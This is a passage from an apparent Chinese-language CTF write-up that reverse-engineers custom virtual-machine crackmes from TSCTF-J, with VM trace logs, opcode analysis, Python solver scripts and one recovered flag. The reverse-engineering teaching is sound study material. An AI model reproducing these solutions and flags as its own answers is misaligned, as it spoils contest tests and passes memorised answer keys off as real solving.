1;</span><br><span class="line">E = D + 1;</span><br><span class="line">229 ^ 58 = 223</span><br><span class="line">E = D + 1;</span><br><span class="line">F = E + 1;</span><br><span class="line">58 ^ 36 = 30</span><br><span class="line">F = E + 1;</span><br><span class="line">10 = F + 1;</span><br><span class="line">36 ^ 18 = 54</span><br><span class="line">10 = F + 1;</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">18 ^ 127 = 109</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">127 ^ 176 = 207</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">176 ^ 108 = 220</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">108 ^ 86 = 58</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">86 ^ 194 = 148</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">194 ^ 211 = 17</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">211 ^ 0 = 211</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">0 ^ 154 = 154</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">154 ^ 140 = 22</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">140 ^ 242 = 126</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">242 ^ 239 = 29</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">239 ^ 62 = 209</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">62 ^ 25 = 39</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">25 ^ 118 = 111</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">118 ^ 66 = 52</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">66 ^ 180 = 246</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">180 ^ 110 = 218</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">110 ^ 202 = 164</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">23 = 22 + 1;</span><br><span class="line">202 ^ 221 = 23</span><br><span class="line">23 = 22 + 1;</span><br></pre></td></tr></table></figure><p>可以分析得到逻辑</p><pre><code>1. 在 vm_execute 的首个循环里，按照索引 i 计算掩码 ((0xAB + 0x13*i) &amp; 0xFF)，并对 buf[i] 做异或。2. 第二个循环把每个字节拆成高/低 4bit，通过 S 盒 sbox = [0xC,0x5,0x6,0xB,0x9,0x0,0xA,0xD,0x3,0xE,0xF,0x8,0x4,0x7,0x1,0x2] 逐一替换后再组合。3. 第三个循环按顺序执行 buf[i] ^= buf[(i+1)%35]（最后一个元素用已更新过的 buf[0]）。4. 校验</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0 * 19 = 0</span><br><span class="line">AB = 0 + AB;</span><br><span class="line">171 ^ 49 = 154</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">1 * 19 = 19</span><br><span class="line">BE = 13 + AB;</span><br><span class="line"></span><br><span class="line">190 ^ 49 = 143</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">2 * 19 = 38</span><br><span class="line">D1 = 26 + AB;</span><br><span class="line"></span><br><span class="line">209 ^ 49 = 224</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">3 * 19 = 57</span><br><span class="line">E4 = 39 + AB;</span><br></pre></td></tr></table></figure><p>很明显一直在更新0x13 ，再加个0xAB 这里dump时候都是16进制</p><p>再往下，到 “10 ^ 50 &#x3D; 56 &#x2F; 11D &#x3D; 72 + AB” 这一块，成对出现一条右移或与操作、紧接着又有 LOAD_TABLE16 那些断点打印（在 output.里为 &lt;值&gt; &gt;&gt; 4 &#x3D; …、&lt;值&gt; &lt;&lt; 4 &#x3D; …）。这些输出说明每个字节都被拆成高低 4 bit 送进 S 盒，再合成一个新字节。</p><p>所以”很容易”看出是 nibble S-box。</p><p>再往后的 “29 ^ 50 &#x3D; 47 … 58 ^ 36 &#x3D; 30 …” 那串，则是 LOAD_IN + ADD 1 + MOD 35 + XOR 的动作：输出[i] &#x3D; buffer[i] ^ buffer[(i+1)%35]。日志可以直白地呈现出 “A ^&#x3D; B”。特别是倒数几行还能看到最后一个元素在用已经更新过的 buffer[0]，说明是环形依赖。</p><p>stage2你要结合这个</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013195026065.png" alt="image-20251013195026065"></p><p>其实还是有点难想到的</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">    <span class="number">0x35</span>, <span class="number">0xF1</span>, <span class="number">0x6A</span>, <span class="number">0x09</span>, <span class="number">0xE8</span>, <span class="number">0x60</span>, <span class="number">0x95</span>, <span class="number">0xC7</span>, <span class="number">0xF5</span>, <span class="number">0xFE</span>,</span><br><span class="line">    <span class="number">0x3F</span>, <span class="number">0x29</span>, <span class="number">0xA8</span>, <span class="number">0xA7</span>, <span class="number">0x65</span>, <span class="number">0x11</span>, <span class="number">0xBD</span>, <span class="number">0x34</span>, <span class="number">0xB9</span>, <span class="number">0x53</span>,</span><br><span class="line">    <span class="number">0x92</span>, <span class="number">0x60</span>, <span class="number">0x1A</span>, <span class="number">0x7E</span>, <span class="number">0x46</span>, <span class="number">0xAA</span>, <span class="number">0x59</span>, <span class="number">0x56</span>, <span class="number">0x18</span>, <span class="number">0xBC</span>,</span><br><span class="line">    <span class="number">0x7A</span>, <span class="number">0x5B</span>, <span class="number">0x71</span>, <span class="number">0x4F</span>, <span class="number">0xA1</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">sbox = [<span class="number">0xC</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xB</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0xA</span>, <span class="number">0xD</span>, <span class="number">0x3</span>, <span class="number">0xE</span>, <span class="number">0xF</span>, <span class="number">0x8</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0x1</span>, <span class="number">0x2</span>]</span><br><span class="line">inv_sbox = &#123;v: i <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(sbox)&#125;</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 环形xor</span></span><br><span class="line">xor_prefix = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">    xor_prefix ^= enc[i]</span><br><span class="line"></span><br><span class="line">stage2 = [<span class="number">0</span>] * n</span><br><span class="line">stage2[<span class="number">0</span>] = enc[-<span class="number">1</span>] ^ xor_prefix ^ enc[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">    stage2[i + <span class="number">1</span>] = stage2[i] ^ enc[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sbox</span></span><br><span class="line">stage1 = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> stage2:</span><br><span class="line">    hi = inv_sbox[b &gt;&gt; <span class="number">4</span>]</span><br><span class="line">    lo = inv_sbox[b &amp; <span class="number">0xF</span>]</span><br><span class="line">    stage1.append((hi &lt;&lt; <span class="number">4</span>) | lo)</span><br><span class="line"></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(stage1):</span><br><span class="line">    mask = (<span class="number">0xAB</span> + <span class="number">0x13</span> * i) &amp; <span class="number">0xFF</span></span><br><span class="line">    flag.append(b ^ mask)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag).decode())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSCTF-J&#123;Y0u_@4r3_R4@11&amp;_s0lxE_VVmm&#125;</span><br></pre></td></tr></table></figure><h3 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h3><p>侥幸之前看过(大概做到了把虚拟机的是线性变换发现就没做了hh)，但没有出，赛中出了</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013200533177.png" alt="image-20251013200533177"></p><p>这里有个54C8函数进去看看</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013200557720.png" alt="image-20251013200557720"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013201401830.png" alt="image-20251013201401830"></p><p>结合55F4一起看，unk_1000096C0有点像vmcode不确定，55F4有点像vm的代码 switch的</p><p>没有发现主要的加密逻辑，基本能确定是vm了</p><p>sub_1000054C8这个方法，其实就是在做搭虚拟机实例，同时申请了三块区域，可能是虚拟机需要的数据区</p><p>一次ka你了 sub_1000057C8 等十余个函数，发现逻辑都很底层（逐位加法、移位乘法、手工 XOR）。根据行为重命名：vm_op_set_reg、vm_op_add_regs、vm_op_store_mem 等。例如 sub_100005d30 检查 data+0x1D6 的比较结果 + 36 次计数后输出“right”，因此这是终止条件。</p><p>输入长度为36</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013202635050.png" alt="image-20251013202635050"></p><p>55F4函数中 VM执行 ，遍历 8 字节的指令槽，读取末尾的 16 bit opcode，根据 opcode 调用 vtable 上不同的处理函数。循环次数固定 74888&#x2F;8&#x3D;9361 次</p><p>一次确认了那些函数的作用，如下面是一个加法操作</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013203246478.png" alt="image-20251013203246478"></p><p>有点抽象，这些vm_add的确实有点抽象，问GPT就知道了</p><p>做了个重命名</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013204617528.png" alt="image-20251013204617528"></p><p>sub_1000054C8把 off_1000080F8 填进新对象的第一个指针，并没有把它复制到字节码区，而是保存在结构的第一个字段。随后 vm_interpret 里，取指令时是从 v1[1]（也就是那块 0x14000 的缓冲）按 8 字节顺序读取，并把第四个 16 位字段当 opcode(v3 + n74888 + 6)。</p><p>其他三个 16 位字段（0&#x2F;2&#x2F;4）从未直接拿来做分支，只在各 handler 内按寄存器索引，内存地址等用途被解读。</p><p>前三个是操作数</p><p>之后想要进展，我们需要确认vm内存布局</p><p>解释器在 vm_write_data16&#x2F;vm_read_data16 等函数里不停地对某块内存+偏移做读写。如果不知道这些偏移对应什么，就无法理解每条 opcode 对状态的影响</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013205257487.png" alt="image-20251013205257487"></p><p>注意到几个信息</p><p>vm_write_small_reg 的实现是：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013205844754.png" alt="image-20251013205844754"></p><p>在做赋值操作，说明四个寄存器就放在数据块偏移 0x200 开始的连续 8 字节里。vm_read_small_reg 用同样的偏移读数，所以寄存器位点确定无疑。</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果参数 idx 在 1..4，就把 val 存到 base + 0x200 + 2*(idx-1)。与之成对的 vm_read_small_reg 用完全相同的偏移取回这个值。很明显这就是对固定数量槽位的读写，而不像普通内存（普通内存用的是 base + 2*addr）</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013210000999.png" alt="image-20251013210000999"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">相当于 *(WORD *)(context + 0x1D6) = (regA == regB);</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013210326302.png" alt="image-20251013210326302"></p><p>输入字符串在 data[0..35] ，4 个 16 位寄存器在 data+0x200，比较结果在 data+0x1D6，成功计数在 data+0x1D8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm_op_check_success 则先检查这个字，再把 *(WORD *)(context + 0x1D8) 自增；当它增到 36 时返回 “right”，否则若有任意一次失败直接调用 sub_1000055DC(&quot;wrong\n&quot;) 退出。这样就能定位比较结果和计数器的具体偏移。</span><br></pre></td></tr></table></figure><p>普通内存读写是：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013210408496.png" alt="image-20251013210408496"></p><p>总结下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data+idx*2 属于通用内存，data+0x200 起是4个寄存器槽，data+0x1D6/0x1D8 储存比较标志和成功计数。输入字符串被run_vm_from_input写进数据区开头</span><br></pre></td></tr></table></figure><p>因为vim_interpret是8字节8字节读取的，看逻辑我们解释器的 switch 里，合法opcode只有 case 1 到case 0xC共 12 种，自己手动确认了下确实那一段是bytecode,也可以写个小脚本读取确认下</p><p>确定字节码起点 0x96c0 后，我用 Python 读取那段数据，并按 8 字节一步解成 (arg0, arg1, arg2, opcode) 四个 16 位数，打印前面几十条</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chall&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0x96c0</span>)</span><br><span class="line">    data=f.read(<span class="number">9360</span>*<span class="number">8</span>)</span><br><span class="line">insts=[struct.unpack_from(<span class="string">&#x27;&lt;HHHH&#x27;</span>, data, i*<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>)]</span><br><span class="line"><span class="keyword">for</span> i,(a,b,c,op) <span class="keyword">in</span> <span class="built_in">enumerate</span>(insts):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i:04d&#125;</span>: op=<span class="subst">&#123;op:04x&#125;</span> args=(<span class="subst">&#123;a:04x&#125;</span>,<span class="subst">&#123;b:04x&#125;</span>,<span class="subst">&#123;c:04x&#125;</span>)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>能发现a1516这样的块重复出现了约36次，对应flag长度36</p><p>输出显示比较总是在指令号 258、518、778…出现，而下一个 op&#x3D;9 紧随其后（259、519、779…）。因此每两次比较之间隔着 260 条指令，取这段长度作为一个块再去分析就能覆盖整个逻辑</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013212545236.png" alt="image-20251013212545236"></p><p>7出现的次数与flag长度相同也有理由怀疑其是cmp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chall&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0x96c0</span>)</span><br><span class="line">    data = f.read(<span class="number">9360</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">insts = [struct.unpack_from(<span class="string">&#x27;&lt;HHHH&#x27;</span>, data, i * <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9360</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i, (a, b, c, op) in enumerate(insts):</span></span><br><span class="line"><span class="comment">#     print(f&#x27;&#123;i:04d&#125;: op=&#123;op:04x&#125; args=(&#123;a:04x&#125;,&#123;b:04x&#125;,&#123;c:04x&#125;)&#x27;)</span></span><br><span class="line"></span><br><span class="line">ops_used = &#123;op <span class="keyword">for</span> _, _, _, op <span class="keyword">in</span> insts&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;\nunique opcodes in first 9360 instructions: <span class="subst">&#123;<span class="built_in">sorted</span>(ops_used)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unique opcodes in first 300 instructions: [1, 3, 4, 5, 6, 7, 9, 10]</span><br></pre></td></tr></table></figure><p>只出现了这8种指令[1, 3, 4, 5, 6, 7, 9, 10]</p><p>意味着在整块里出现的 opcode 只有 1（set）、3（加）、4（xor）、5（store）、6（load）、7（compare）、9（check）、10（减）。发现 4 总是成对地把同一个寄存器和自己 XOR 为 0，用来清寄存器。没有乘法、取反、非线性操作。</p><p>很多条指令都是 op&#x3D;0001 args&#x3D;(0001,0026,0000)，即把寄存器 1 设为常量 0x26。接着马上就有 op&#x3D;0005 args&#x3D;(0001,0003,0000)，即用寄存器 1 里的值当地址，把寄存器 3 的内容写进数据区。这一对组合出现多次，说明 0x26 这个槽一直被当作累加器。</p><p>本题最终要的就是找指令规律和明确对应关系，还是要多试</p><p>我们可以写一个新的测试脚本探寻规律</p><p>可以用”临时线性化脚本”，其实就是把每条 opcode 的作用改写成”在字典里做加减”</p><ol><li><p>把一块 260 条指令读出来，每条 8 字节拆成 (dst, op1, op2, opcode)。</p></li><li><p>用字典表示寄存器&#x2F;内存的线性表达式：</p><ul><li>{‘const’: 0, ‘x0’:1, ‘x5’:65535} 表示 x0 - x5（因为 65535 ≡ -1 mod 65536）。</li><li>初始时 mem[i] &#x3D; {‘xi’:1, ‘const’:0} 代表输入的第 i 个字符。</li></ul></li><li><p>根据 opcode 更新这些字典：</p><ul><li>1：寄存器 ← 常量 → {‘const’: imm}。</li><li>3&#x2F;10：寄存器 ← 加&#x2F;减 → 合并字典系数。</li><li>5&#x2F;6：以寄存器值当地址，读写 mem。</li><li>4：异或清零 → 写成 {‘const’:0}。</li><li>7 之后我们不再需要处理（它只做比较）。</li></ul></li><li><pre><code> 块结束时，读出 mem[0x26]，得到某个输入字符的线性组合，regs[1][&#39;const&#39;] 就是常量目标。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">测试代码：</span><br><span class="line"></span><br><span class="line">&gt; 这个脚本挺难写的还好GPT5帮忙了，不然真写不出来......</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import struct</span><br><span class="line">from fractions import Fraction</span><br><span class="line"></span><br><span class="line">MOD = 1 &lt;&lt; 16</span><br><span class="line">BLOCK_SIZE = 260</span><br><span class="line">NUM_BLOCKS = 36</span><br><span class="line">BYTECODE_OFFSET = 0x96C0</span><br><span class="line">BYTECODE_LEN = BLOCK_SIZE * NUM_BLOCKS * 8</span><br><span class="line"></span><br><span class="line">def expr_const(v):</span><br><span class="line">    return &#123;&#x27;const&#x27;: v % MOD&#125;</span><br><span class="line"></span><br><span class="line">def expr_add(e1, e2):</span><br><span class="line">    keys = set(e1) | set(e2)</span><br><span class="line">    return &#123;k: (e1.get(k, 0) + e2.get(k, 0)) % MOD for k in keys&#125;</span><br><span class="line"></span><br><span class="line">def expr_sub(e1, e2):</span><br><span class="line">    keys = set(e1) | set(e2)</span><br><span class="line">    return &#123;k: (e1.get(k, 0) - e2.get(k, 0)) % MOD for k in keys&#125;</span><br><span class="line"></span><br><span class="line">def norm16(v):</span><br><span class="line">    return v - 0x10000 if v &gt;= 0x8000 else v</span><br><span class="line"></span><br><span class="line">def run_block(insts):</span><br><span class="line">    regs = &#123;i: &#123;&#x27;const&#x27;: 0&#125; for i in range(1, 5)&#125;</span><br><span class="line">    mem = &#123;i: &#123;f&#x27;x&#123;i&#125;&#x27;: 1, &#x27;const&#x27;: 0&#125; for i in range(36)&#125;</span><br><span class="line">    mem[0x26] = &#123;&#x27;const&#x27;: 0&#125;</span><br><span class="line">    for dst, op1, op2, opcode in insts:</span><br><span class="line">        if opcode == 1:  # set reg</span><br><span class="line">            regs[dst] = expr_const(op1)</span><br><span class="line">        elif opcode == 3:  # add</span><br><span class="line">            regs[dst] = expr_add(regs[op1], regs[op2])</span><br><span class="line">        elif opcode == 10:  # sub</span><br><span class="line">            regs[dst] = expr_sub(regs[op1], regs[op2])</span><br><span class="line">        elif opcode == 5:  # store</span><br><span class="line">            addr = regs[dst][&#x27;const&#x27;]</span><br><span class="line">            mem[addr] = dict(regs[op1])</span><br><span class="line">        elif opcode == 6:  # load</span><br><span class="line">            addr = regs[dst][&#x27;const&#x27;]</span><br><span class="line">            regs[op1] = dict(mem.get(addr, &#123;&#x27;const&#x27;: 0&#125;))</span><br><span class="line">        elif opcode == 4:  # xor -&gt; zero</span><br><span class="line">            regs[dst] = &#123;&#x27;const&#x27;: 0&#125;</span><br><span class="line">    expr = mem[0x26]</span><br><span class="line">    coeffs = [0] * 36</span><br><span class="line">    for name, val in expr.items():</span><br><span class="line">        if name == &#x27;const&#x27;:</span><br><span class="line">            continue</span><br><span class="line">        idx = int(name[1:])</span><br><span class="line">        coeffs[idx] = norm16(val)</span><br><span class="line">    target = norm16(regs[1][&#x27;const&#x27;])</span><br><span class="line">    return coeffs, target</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    with open(&#x27;chall&#x27;, &#x27;rb&#x27;) as f:</span><br><span class="line">        f.seek(BYTECODE_OFFSET)</span><br><span class="line">        buf = f.read(BYTECODE_LEN)</span><br><span class="line"></span><br><span class="line">    rows = []</span><br><span class="line">    rhs = []</span><br><span class="line">    for blk in range(NUM_BLOCKS):</span><br><span class="line">        block = [</span><br><span class="line">            struct.unpack_from(&#x27;&lt;HHHH&#x27;, buf, blk * BLOCK_SIZE * 8 + i * 8)</span><br><span class="line">            for i in range(BLOCK_SIZE)</span><br><span class="line">        ]</span><br><span class="line">        coeffs, target = run_block(block)</span><br><span class="line">        rows.append(coeffs)</span><br><span class="line">        rhs.append(target)</span><br><span class="line"></span><br><span class="line">    for i, (row, target) in enumerate(zip(rows, rhs)):</span><br><span class="line">        nz = [(idx, val) for idx, val in enumerate(row) if val]</span><br><span class="line">        print(f&#x27;Block &#123;i:02d&#125; target=&#123;target:4d&#125; terms=&#123;len(nz)&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></code></pre></li></ol><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013215227593.png" alt="image-20251013215227593"></p><p>这 36 行输出各自对应虚拟机的 36 个检测块，意思是：</p><p>Block XX target&#x3D;YYY：这个块最终把data[0x26]累加成一个值，然后要求它等于常数 YYY。比如第一条 target&#x3D;-6，说明块 0 最终要求组合结果 &#x3D; -6。</p><p>terms&#x3D;36：这一块里把 36 个输入字符全部用到了（每个变量的系数都非零）。换句话说，Block 00 其实表示 Σ coeff_i * x_i &#x3D; -6，这里的 coeff_i 包括正负 1、±其他整系数，x_i 就是 flag 第 i 个字符的 ASCII 值。</p><p>这些信息是我们后面构建线性方程组的原料。对每个块，我们不仅记录 target，还记录一整行 36 个系数（脚本里 run_block 返回的 coeffs）。把 36 行系数拼在一起，就是一个 36×36 的矩阵；把 36 个 target 拼成右端向量，然后解这个线性系统，就能得到 36 个字符的 ASCII 数值，自然就复原出 flag。</p><p>并不是拿具体输入去跑 VM，而是把每个寄存器&#x2F;内存槽都用符号表达式来表示（x0..x35 对应 36 个输入字符）。由于字节码里只出现了设常量、加&#x2F;减、内存读写这些线性操作，整条指令流对输入的影响天然是线性的，能一直用”符号系数”追踪下去。</p><p>因此，跑完一个块后得到的不是“实际值”，而是一个方程：memory[0x26] &#x3D; Σ coeff_i * x_i，而 reg1 给出同一块中设置的常数 target。这两者相等就形成了线性约束 Σ coeff_i * x_i &#x3D; target。</p><p>如果只盯住第一块，在这个块里把所有指令跑一遍，最终都会看到：该块把输入字符按特定系数累加到 memory[0x26]，然后和 reg1 里的常量比较。只要能把这串系数和常量提炼出来，就知道这一组的线性关系了。</p><p>在抽象出 36 条线性方程后，把它们堆成一个 36×36 的矩阵 A 和一个长度 36 的常量向量 b（脚本里 rows 和 rhs）</p><p>run_block得到关系，solve_linear来解开这个关系</p><p>举一个例子</p><p>只有三个指令，输入长度也只有3</p><ul><li>set rX, imm：把寄存器 rX 设成常数。</li><li>load rX, addr：读取数据区 mem[addr]（一开始就是输入字符）放进寄存器。</li><li>add rX, rY：把 rX &#x3D; rX + rY。</li><li>store addr, rX：把寄存器写回内存。</li><li>cmp rX, imm：比较寄存器是否等于常数。</li></ul><p> 假设字节码只有 5 条：</p><pre><code>1. set r0, 0          ; 把寄存器0清零2. load r1, 0         ; 读取 x03. add r0, r1         ; r0 += x04. load r1, 1         ; r1 = x15. add r0, r1         ; r0 += x16. load r1, 2         ; r1 = x27. add r0, r1         ; r0 += x28. cmp r0, 100        ; 检查 x0 + x1 + x2 == 100 ?</code></pre><p>这题的思路就是</p><p>把他们符号化</p><p>mem[0] &#x3D; x0</p><p>mem[1] &#x3D; x1</p><p>mem[2] &#x3D; x2</p><p>然后按指令跑：</p><ul><li>指令 1：r0 &#x3D; 0</li><li>指令 2：r1 &#x3D; x0</li><li>指令 3：r0 &#x3D; r0 + r1 &#x3D; 0 + x0 &#x3D; x0</li><li>指令 4：r1 &#x3D; x1</li><li>指令 5：r0 &#x3D; x0 + x1</li><li>指令 6：r1 &#x3D; x2</li><li>指令 7：r0 &#x3D; x0 + x1 + x2</li><li>指令 8：要求 r0 &#x3D;&#x3D; 100</li></ul><p>因此我们得到一个线性方程：x0 + x1 + x2 &#x3D; 